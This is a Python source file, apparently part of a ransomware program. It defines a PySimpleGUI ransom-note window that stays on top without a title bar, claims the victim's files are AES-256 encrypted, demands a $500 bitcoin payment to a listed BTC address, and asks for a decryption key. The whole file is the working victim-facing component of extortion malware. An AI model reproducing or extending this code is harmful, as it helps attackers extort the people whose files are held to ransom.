import PySimpleGUI as sg


class RansomNote(object):
    def __init__(self):
        sg.theme('DarkRed2')
        layout = [[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
               [sg.Text('')],
               [sg.Text('How can I recover my files?', font='bold')],
               [sg.Text('You must have to pay the 500$ ransom in bitcoins.',
                        font='Helvetica 13')],
               [sg.Text('Once you do the payment, we will send the decryption key via mail.',
                        font='Helvetica 13')],
               [sg.Text(
                   'Payment must be done through Bitcoin wallet to the following BTC address:', font='Helvetica 13')],
               [sg.Text('1BhKDQDY55XMPqnSUDtCMCG8R6UX7CSbzP', font='bold')],
               [sg.Text('')],
               [sg.Text('')],
               [sg.Text(
                   'Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
               [sg.InputText()],
               [sg.Text('')],
               [sg.Button('Decrypt files')]]

        window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')
        self.note = window
